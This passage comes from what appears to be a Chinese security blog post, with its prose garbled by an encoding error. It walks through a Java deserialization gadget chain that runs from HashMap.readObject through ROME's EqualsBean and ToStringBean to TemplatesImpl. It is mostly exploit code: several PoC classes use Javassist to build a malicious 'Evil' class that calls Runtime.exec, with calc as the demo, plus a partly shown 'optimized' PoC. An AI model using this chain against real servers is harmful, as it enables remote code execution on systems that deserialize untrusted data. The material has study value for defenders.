class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(c1, templates);</span><br><span class="line">        toStringBean.toString();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192215793.png" alt="image-20221116192215793"></p><p>ç»§ç»­å¾€ä¸Šæ‰¾è°ƒç”¨<code>toString()</code>çš„åœ°æ–¹ï¼Œ<code>EqualsBean.beanHashCode()</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192225132.png" alt="image-20221116192225132"></p><p><code>_obj</code>å¯ä»¥é€šè¿‡æ„é€ å‡½æ•°ç›´æ¥èµ‹å€¼</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192229555.png" alt="image-20221116192229555"></p><p><strong>exp3</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(c1, templates);</span><br><span class="line"><span class="comment">//        toStringBean.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> toStringBean.getClass();</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(c2, toStringBean);</span><br><span class="line">        equalsBean.beanHashCode();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192235913.png" alt="image-20221116192235913"></p><p>ç»§ç»­å¾€ä¸Šæ‰¾ï¼Œå‘ç°è°ƒç”¨<code>beanHashCode()</code>çš„åœ°æ–¹æ˜¯<code>EqualsBean.hashCode()</code>,é‚£ä¹ˆè°ƒç”¨<strong>hashcode</strong>çš„åœ°æ–¹å°±å¤šäº†ï¼Œå¯ä»¥ç”¨<strong>HashMap.readObject</strong>ä½œä¸ºå…¥å£ï¼Œä»¥å®ç°è°ƒç”¨ä»»æ„ç±»çš„hashcode</p><h3 id="å®Œæ•´gadget"><a href="#å®Œæ•´gadget" class="headerlink" title="å®Œæ•´gadget"></a>å®Œæ•´gadget</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br><span class="line">HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">EqualsBean.hashCode()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a><strong>poc</strong></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(c1, templates);</span><br><span class="line"><span class="comment">//        toStringBean.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> toStringBean.getClass();</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(c2, toStringBean);</span><br><span class="line"><span class="comment">//        equalsBean.beanHashCode();</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unseralize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192243413.png" alt="image-20221116192243413"></p><h3 id="POCä¼˜åŒ–"><a href="#POCä¼˜åŒ–" class="headerlink" title="POCä¼˜åŒ–"></a>POCä¼˜åŒ–</h3><p>åˆ©ç”¨é“¾åœ¨ç»™HashMapèµ‹å€¼çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨<code>put()</code>å‡½æ•°ï¼Œæœ€ç»ˆä¼šè°ƒç”¨ä¸€æ¬¡<code>key.hashcode()</code>è¿›è€Œåœ¨ååºåˆ—åŒ–ä¹‹å‰å°±æ‰§è¡Œä¸€æ¬¡å‘½ä»¤ï¼Œå¯ä»¥é€šè¿‡åå°„ä¿®æ”¹HashMapçš„<code>key</code>å€¼ä»è€Œé¿å…åºåˆ—åŒ–çš„æ—¶å€™å°±æ‰§è¡Œå‘½ä»¤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"><span class="comment">//        toStringBean.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"><span class="comment">//        equalsBean.beanHashCode();</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span 